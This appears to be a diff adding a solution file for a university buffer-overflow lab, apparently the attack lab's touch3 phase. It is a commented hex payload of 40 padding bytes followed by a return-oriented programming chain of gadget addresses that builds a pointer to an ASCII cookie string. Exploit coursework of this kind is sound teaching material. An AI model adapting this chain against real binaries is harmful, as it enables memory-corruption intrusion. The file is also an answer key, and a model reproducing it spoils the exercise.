@@ -1,0 +1,12 @@
+30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 40 bytes */
+ab 19 40 00 00 00 00 00 /* popq %rax instruction address */
+20 00 00 00 00 00 00 00 /* distance value to %rax : 0x20(32), final to rsi */
+dd 19 40 00 00 00 00 00 /* movl %eax, %edx instruction address 0x4019dd */
+34 1a 40 00 00 00 00 00 /* movl %edx, %ecx instruction address 0x401a34 */
+13 1a 40 00 00 00 00 00 /* movl %ecx, %esi instruction address 0x401a13 */
+06 1a 40 00 00 00 00 00 /* movq %rsp, %rax instruction address 0x401a06 */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
+d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax instruction address 0x4019d6 */
+c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
+fa 18 40 00 00 00 00 00 /* touch3 start address 0x4018fa */
+35 39 62 39 39 37 66 61 00 /* cookie 59b997fa ASCII value */
